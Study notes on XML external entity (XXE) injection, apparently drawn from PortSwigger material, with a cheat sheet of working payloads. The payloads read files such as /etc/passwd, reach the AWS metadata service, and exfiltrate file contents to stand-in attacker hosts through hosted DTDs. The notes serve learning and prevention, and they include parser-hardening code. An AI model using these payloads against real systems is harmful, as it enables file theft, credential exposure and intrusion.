# XXE Injection — Complete Study Notes

> Based on: https://portswigger.net/web-security/xxe and related pages

---

## Table of Contents

1. [XML Background — Entities and DTDs](#1-xml-background--entities-and-dtds)
2. [What is XXE Injection?](#2-what-is-xxe-injection)
3. [How XXE Vulnerabilities Arise](#3-how-xxe-vulnerabilities-arise)
4. [Types of XXE Attacks](#4-types-of-xxe-attacks)
   - [File Retrieval](#41-file-retrieval)
   - [SSRF via XXE](#42-ssrf-via-xxe)
   - [Blind XXE](#43-blind-xxe)
   - [XInclude Attacks](#44-xinclude-attacks)
   - [XXE via File Upload](#45-xxe-via-file-upload)
   - [XXE via Modified Content-Type](#46-xxe-via-modified-content-type)
5. [Blind XXE — Deep Dive](#5-blind-xxe--deep-dive)
   - [Out-of-Band Detection](#51-out-of-band-detection)
   - [Data Exfiltration via OOB](#52-data-exfiltration-via-oob)
   - [Error-Based Data Retrieval](#53-error-based-data-retrieval)
   - [Repurposing Local DTDs](#54-repurposing-local-dtds)
6. [Finding Hidden Attack Surface](#6-finding-hidden-attack-surface)
7. [How to Find and Test for XXE](#7-how-to-find-and-test-for-xxe)
8. [How to Prevent XXE](#8-how-to-prevent-xxe)
9. [Cheat Sheet — Quick Payloads](#9-cheat-sheet--quick-payloads)

---

## 1. XML Background — Entities and DTDs

### What is XML?

XML (eXtensible Markup Language) is a language for storing and transporting structured data. Unlike HTML, XML tags are not predefined — you invent your own tag names to describe the data.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>Alice</name>
  <role>admin</role>
</user>
```

XML was widely used for web APIs and data exchange. Many applications still use it today, especially in:
- SOAP web services
- File formats: DOCX, XLSX, SVG, PDF (partial), OpenDocument
- Configuration files
- RSS/Atom feeds

### What are XML Entities?

Entities are **shortcuts** or **references** that replace a name with a value when the XML is parsed. They prevent repetition and allow special characters inside data.

**Built-in entities** (reserved characters):

| Entity | Character |
|--------|-----------|
| `&lt;` | `<`       |
| `&gt;` | `>`       |
| `&amp;` | `&`      |
| `&apos;` | `'`     |
| `&quot;` | `"`     |

**Custom entities** — defined by the developer:

```xml
<!DOCTYPE foo [ <!ENTITY companyname "PortSwigger"> ]>
<data>Welcome to &companyname;</data>
<!-- parser outputs: Welcome to PortSwigger -->
```

### What is a Document Type Definition (DTD)?

A DTD declares the structure and rules of an XML document. It appears in a `DOCTYPE` element at the top of the document.

```xml
<!DOCTYPE note [
  <!ELEMENT note (to,from,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
```

DTDs can be:
- **Internal** — declared inline inside the XML document
- **External** — loaded from a URL or file path
- **Hybrid** — internal DTD that references external one

### XML External Entities

An external entity loads its value from a **URL or file path** using the `SYSTEM` keyword:

```xml
<!DOCTYPE foo [
  <!ENTITY ext SYSTEM "http://example.com/data.txt">
]>
```

The `file://` protocol makes file reading possible:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

When the parser sees `&xxe;` in the document, it reads `/etc/passwd` and substitutes the file contents — **this is the core of XXE injection**.

### XML Parameter Entities

Parameter entities are a special kind of entity used **inside DTD declarations only** (not in document body). They use the `%` prefix:

```xml
<!DOCTYPE foo [ <!ENTITY % myparamEntity "hello"> ]>
```

They are referenced with `%name;` syntax:

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
  %xxe;
]>
```

Parameter entities are critical for advanced blind XXE attacks because they can load and execute external DTD content.

---

## 2. What is XXE Injection?

**XML External Entity (XXE) injection** is a server-side vulnerability where an attacker injects a malicious XML entity definition into input processed by a vulnerable XML parser.

### Impact

XXE can lead to:
- **Arbitrary file read** from the server filesystem
- **Server-Side Request Forgery (SSRF)** — force the server to make HTTP/DNS requests to internal or external systems
- **Remote code execution** (in rare, chained scenarios)
- **Denial of Service** (Billion Laughs / recursive entity expansion)
- **Credentials and secrets exposure** (reading config files, SSH keys, environment files)

### Simple Mental Model

```
Normal flow:  App parses XML → extracts data value → uses it
XXE flow:     Attacker injects entity in DOCTYPE →
              Parser resolves external entity (reads file / makes HTTP request) →
              Entity value (file content) is used in the application response
```

---

## 3. How XXE Vulnerabilities Arise

XXE vulnerabilities arise because:

1. **XML parsers support external entities by default.** The XML spec allows external entities as a feature. Most parsers (Java SAX, DOM, libxml, .NET XmlDocument) enable this by default.

2. **Developers don't disable dangerous features.** External entity resolution, XInclude, and DTD processing are rarely needed but frequently left on.

3. **Applications blindly trust XML input.** An app that accepts XML from users rarely sanitizes or validates it at the DTD level.

4. **Hidden XML surfaces.** Many apps process XML in background logic (SOAP, XML-based file uploads) without the developer realizing it is a risk.

### Real-World Example Context

A stock-checking feature sends this request when the user clicks "Check stock":

```http
POST /product/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>3</productId>
  <storeId>1</storeId>
</stockCheck>
```

The server parses the XML, reads `productId`, queries the database, and returns stock levels. No external entities are expected — but the parser still accepts them.

---

## 4. Types of XXE Attacks

### 4.1 File Retrieval

**Goal**: Read an arbitrary file from the server filesystem and return its contents in the application response.

**How it works**:
1. Inject a `DOCTYPE` block declaring an external entity pointing to a file path
2. Replace a reflected XML value with the entity reference
3. The parser substitutes the file content and the app returns it

**Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Response** (if vulnerable):

```
Invalid productId: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Common target files:**

| OS      | File                                     | Contents                        |
|---------|------------------------------------------|---------------------------------|
| Linux   | `/etc/passwd`                            | User accounts                   |
| Linux   | `/etc/shadow`                            | Hashed passwords (root only)    |
| Linux   | `/etc/hostname`                          | Server hostname                 |
| Linux   | `/proc/self/environ`                     | Environment variables           |
| Linux   | `/proc/self/cmdline`                     | Process command line            |
| Linux   | `/var/www/html/config.php`               | App config / DB credentials     |
| Windows | `C:\Windows\System32\drivers\etc\hosts`  | Hosts file                      |
| Windows | `C:\inetpub\wwwroot\web.config`          | .NET app config                 |

---

### 4.2 SSRF via XXE

**Goal**: Force the server to make HTTP or DNS requests to internal systems the attacker cannot reach directly.

**Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

This hits the AWS metadata service at `169.254.169.254` from inside the server. In cloud environments this can retrieve:
- IAM role names → `/latest/meta-data/iam/security-credentials/`
- Access keys → role-specific paths
- User data scripts that may contain secrets

**Why this works**: The XML parser makes the HTTP request on behalf of the server, bypassing any firewall rules that block the attacker's IP but allow localhost traffic.

---

### 4.3 Blind XXE

**Goal**: Exploit XXE when the application does not return the entity value in any response.

Blind XXE is fully covered in [Section 5](#5-blind-xxe--deep-dive).

---

### 4.4 XInclude Attacks

**When to use**: When you cannot control the full XML document (e.g., your input is embedded inside server-generated XML), so you cannot insert a `DOCTYPE`.

**How it works**: XInclude is an XML feature that lets one XML document include another. It operates at the element level, not the document level, so no DOCTYPE is required.

**Payload (inject into a form field or API parameter):**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Context**: Suppose a product search embeds your search term directly into a server-side XML document:

```xml
<!-- Server-side template -->
<data><search>[YOUR INPUT]</search></data>
```

You cannot add a DOCTYPE before `<data>`, but you can use XInclude inside `<search>`:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

---

### 4.5 XXE via File Upload

**Goal**: Exploit XML processing in file upload functionality.

Many file formats are secretly XML-based:
- **SVG** (Scalable Vector Graphics) → pure XML
- **DOCX / XLSX / PPTX** → ZIP archives containing XML files
- **OpenDocument (ODF)** → ZIP with XML content
- **SOAP XML** → web service requests

**SVG upload payload:**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16">&xxe;</text>
</svg>
```

If the server renders the SVG (e.g., to generate a thumbnail), the entity is resolved. If the rendered image or text is returned to the user, the file contents are disclosed.

---

### 4.6 XXE via Modified Content-Type

**Goal**: Reach XML parsing code even when the endpoint normally accepts JSON or form data.

Some applications accept multiple content types. If you change the `Content-Type` header and send XML, the parser may still process it.

**Normal request:**

```http
POST /api/order HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=3&quantity=1
```

**Modified request:**

```http
POST /api/order HTTP/1.1
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order>
  <productId>&xxe;</productId>
  <quantity>1</quantity>
</order>
```

If the server parses both, the XXE triggers. This is a hidden attack surface that Burp Scanner specifically looks for.

---

## 5. Blind XXE — Deep Dive

Blind XXE occurs when the application is vulnerable to XXE injection but **does not return the entity values** in any response. You need alternative techniques to detect and exploit it.

### 5.1 Out-of-Band Detection

The most reliable detection method: force the server to make an outbound DNS lookup or HTTP request to your controlled server.

**Using a regular entity:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-BURP-COLLABORATOR.com"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Monitor your server or Burp Collaborator for DNS lookups and HTTP requests. A callback confirms the parser is resolving external entities.

**Using XML parameter entities** (when regular entities are blocked):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-BURP-COLLABORATOR.com"> %xxe; ]>
<stockCheck>
  <productId>1</productId>
</stockCheck>
```

The `%xxe;` is evaluated inside the DTD, causing the HTTP request before the document body is even processed.

---

### 5.2 Data Exfiltration via OOB

**Goal**: Read a file and send its contents to your server via a DNS query or HTTP request.

This requires hosting a **malicious external DTD** file on your own server (e.g., `http://attacker.com/evil.dtd`).

**Contents of `evil.dtd` (hosted on attacker server):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Payload sent to vulnerable app:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
<stockCheck>
  <productId>1</productId>
</stockCheck>
```

**Step-by-step execution:**

1. Parser fetches `http://attacker.com/evil.dtd`
2. `%file` entity is defined as the contents of `/etc/passwd`
3. `%eval` is defined — it creates a new entity `%exfiltrate` whose URL contains the file contents
4. `%exfiltrate` fires, making a request to `http://attacker.com/?x=[/etc/passwd contents]`
5. Attacker reads the URL query string on their server logs

> **Note**: Files with newlines (like `/etc/passwd`) may break the URL. Use `file:///etc/hostname` first or use the FTP protocol for multi-line files.

**Why `&#x25;`?**

In external DTD files, you cannot write `%` inside entity definitions — it is a reserved character. You must HTML-encode it as `&#x25;` (hex) or `&#37;` (decimal).

---

### 5.3 Error-Based Data Retrieval

**Goal**: When OOB is blocked (firewall), trigger an XML parsing error that contains file contents inside the error message.

**Malicious external DTD (`evil.dtd`):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**How it works:**
1. `%file` = contents of `/etc/passwd`
2. `%error` = try to open a file path that does not exist, where the filename is the file contents
3. Parser fails to open `file:///nonexistent/root:x:0:0:...` and throws an error
4. The error message includes the nonexistent path → which includes the file contents

**Example error output:**

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

> This only works when the application returns XML parsing error messages to the client.

---

### 5.4 Repurposing Local DTDs

**When to use**: OOB connections are blocked AND external DTD loading is blocked. But a local DTD file exists on the server.

**Concept**: You cannot load a remote DTD, but you can load a **local** DTD file that already exists on the server. If that local DTD defines certain entities, you can **redefine** those entities in your inline DOCTYPE to override their values with malicious content.

**Attack payload** (assuming `/usr/share/yelp/dtd/docbookx.dtd` exists and defines `%ISOamsa;`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck><productId>1</productId></stockCheck>
```

**Locating local DTD files — common paths:**

| Path                                                     | System            |
|----------------------------------------------------------|-------------------|
| `/usr/share/yelp/dtd/docbookx.dtd`                       | Linux GNOME       |
| `/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd`    | Debian/Ubuntu     |
| `/usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd`      | RHEL/CentOS       |
| `/usr/local/app/schema.dtd`                              | Custom app DTD    |
| `/etc/xml/docbook-xml.dtd`                               | Some Linux distros|

**Enumeration technique**: Send each path in a `<!ENTITY % x SYSTEM "file:///path/to/test.dtd"> %x;` payload. If the file exists, no error (or a different error). If missing, you get a file-not-found error.

---

## 6. Finding Hidden Attack Surface

Not all XXE attack surfaces are obvious. Look for:

### 6.1 Non-obvious XML Inputs

- **SOAP endpoints** — SOAP is XML. If a SOAP request contains user data, inject there.
- **API requests** — REST APIs that accept `application/json` may also silently accept `application/xml`.
- **Form submissions with XML back-end** — the browser sends URL-encoded form data, but the server converts it to XML internally.

### 6.2 File Uploads

- **SVG files** — when an app accepts SVG image uploads, the SVG is parsed as XML.
- **Office documents** — DOCX/XLSX/PPTX are ZIP files containing XML. Unzip, inject into `word/document.xml`, and re-zip.
- **XML data imports** — any feature that imports data via XML file.

### 6.3 Content-Type Switching

Try changing `Content-Type: application/x-www-form-urlencoded` to `Content-Type: text/xml` and reformatting the body as XML. If the server still processes it, you have found a hidden surface.

### 6.4 XInclude

When your input ends up inside server-generated XML where you cannot add a DOCTYPE, test for XInclude support by injecting the XInclude namespace declaration and `xi:include` element.

---

## 7. How to Find and Test for XXE

### Step-by-Step Testing Methodology

**1. Identify XML input vectors**
- Intercept all requests with Burp Suite
- Look for `Content-Type: text/xml`, `application/xml`, `application/soap+xml`
- Check for file upload endpoints (SVG, DOCX, XML)
- Try switching content types on JSON/form endpoints

**2. Inject a simple entity**
```xml
<!DOCTYPE foo [ <!ENTITY xxe "test"> ]>
```
If the app throws a parser error, XML injection is possible. If `&xxe;` is reflected, entities work.

**3. Test file retrieval**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
Check the response for file contents.

**4. Test SSRF**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-SERVER.com/"> ]>
<foo>&xxe;</foo>
```
Check your server for DNS / HTTP callbacks.

**5. Test blind XXE (OOB)**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/"> %xxe; ]>
```
Use Burp Collaborator or a controlled server.

**6. Test XInclude**
Inject into form fields or URL parameters:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**7. Test file upload vectors**
Craft a malicious SVG file and upload it. Monitor if the server processes it and returns any file contents.

**8. Automate with Burp Scanner**
The built-in Burp Suite scanner detects most XXE variants automatically including blind OOB detection via Burp Collaborator.

---

## 8. How to Prevent XXE

### Primary Defense — Disable Dangerous Parser Features

The most reliable fix is disabling DTD processing and external entity resolution at the parser level.

**Java (DocumentBuilderFactory):**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**Java (SAXParserFactory):**
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Python (lxml):**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_file, parser)
```

**Python (defusedxml — recommended):**
```python
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)  # safe by default
```

**.NET (XmlReader):**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**PHP:**
```php
libxml_disable_entity_loader(true);  // PHP < 8.0
// PHP 8.0+ disabled by default
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);
```

**Node.js (libxmljs):**
```javascript
const libxmljs = require('libxmljs');
const doc = libxmljs.parseXml(xml, { noent: false, nonet: true });
```

### Secondary Defenses

| Defense | Description |
|---------|-------------|
| Input validation | Validate XML against a strict schema (XSD/DTD whitelist) |
| Allowlist schema | Only accept expected elements and attributes |
| WAF rules | Block `DOCTYPE`, `ENTITY`, `SYSTEM`, `file://`, `%entity` patterns |
| Least privilege | Run the XML parser process with minimal filesystem permissions |
| Network isolation | Block outbound HTTP/DNS from application servers (prevents OOB) |
| Patch parsers | Keep XML parsing libraries updated — many CVEs relate to XXE |

### Why Blocking Keywords is Not Enough

WAF keyword blocking (`DOCTYPE`, `ENTITY`) can be bypassed with:
- URL encoding: `%3C%21DOCTYPE`
- UTF-16 encoding of the XML document
- Nested entity references
- Alternative protocols (`ftp://`, `gopher://`, `expect://`)

Always fix at the parser level, not the input filter level.

---

## 9. Cheat Sheet — Quick Payloads

### Basic File Read
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

### SSRF
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-server.com/"> ]>
<foo>&xxe;</foo>
```

### AWS Metadata SSRF
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>
```

### Blind OOB (regular entity)
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://ATTACKER.com/"> ]>
<foo>&xxe;</foo>
```

### Blind OOB (parameter entity)
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER.com/"> %xxe; ]>
<foo>test</foo>
```

### Blind OOB Data Exfiltration (host evil.dtd on ATTACKER.com)
**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ATTACKER.com/?x=%file;'>">
%eval;
%exfiltrate;
```
**Payload sent to app:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER.com/evil.dtd"> %xxe; ]>
<foo>test</foo>
```

### Error-Based (host evil.dtd on ATTACKER.com)
**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
**Payload sent to app:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER.com/evil.dtd"> %xxe; ]>
<foo>test</foo>
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### Local DTD Repurposing
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>test</foo>
```

### SVG File Upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" y="30">&xxe;</text>
</svg>
```

---

## Reference Links

| Topic | URL |
|-------|-----|
| XXE main topic | https://portswigger.net/web-security/xxe |
| XML entities | https://portswigger.net/web-security/xxe/xml-entities |
| How vulnerabilities arise | https://portswigger.net/web-security/xxe#how-do-xxe-vulnerabilities-arise |
| Testing guidance | https://portswigger.net/web-security/xxe#how-to-find-and-test-for-xxe-vulnerabilities |
| Attack types | https://portswigger.net/web-security/xxe#what-are-the-types-of-xxe-attacks |
| Blind XXE | https://portswigger.net/web-security/xxe/blind |
| Hidden attack surface | https://portswigger.net/web-security/xxe#finding-hidden-attack-surface-for-xxe-injection |
| Prevention | https://portswigger.net/web-security/xxe#how-to-prevent-xxe-vulnerabilities |
| All XXE labs | https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection |
